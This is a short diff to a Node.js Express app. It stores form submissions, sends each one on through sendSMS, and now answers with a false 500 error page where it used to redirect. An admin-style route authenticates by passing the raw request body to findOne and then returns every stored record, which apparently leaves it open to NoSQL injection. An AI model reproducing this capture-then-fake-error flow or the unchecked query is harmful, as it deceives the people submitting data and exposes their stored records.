@@ -11,6 +11,9 @@ const {htmlData, sendSMS} = require('./public/data');
 const app = express();
 app.use(express.json());
 app.use(body_parser.urlencoded({extended :true}));
+app.use(express.static('public/images'));
+app.use(express.static('public/fontawesome/css'));
+app.use(express.static('public'));
 const PORT = process.env.PORT || 3500;
 const _router = express.Router();
 
@@ -60,7 +63,7 @@ _router.route('/').get((req, res)=>{
 
     await imfor.create(req.body).then(result =>{
        sendSMS(result);
-      res.status(301).redirect('/')
+      res.status(500).sendFile(path.join(__dirname,'public','error.html'));
     }).catch(err =>{
       console.log(err)
     });
@@ -74,14 +77,14 @@ let page = readFileSync(path.join(__dirname,'public/page.html'),{encoding:'utf-8
 
  // getting all users
 _router.route('/user_account/api').post(async(req,res)=>{
-  const isExist =  await imfor.findOne(req.body,{_id:1,__v:0});
-  if(isExist){
 
-    const data = await imfor.find({},{__v:0});
-    let renderPage = htmlData(page,data);
-    res.status(200).send(renderPage.join(''));
-
-  }
+    const isExist =  await imfor.findOne(req.body,{_id:1,__v:0});
+    if(isExist){
+  
+      const data = await imfor.find({},{__v:0});
+      let renderPage = htmlData(page,data);
+      res.status(200).send(renderPage.join(''));
+    }
 })
      
   // deleting user
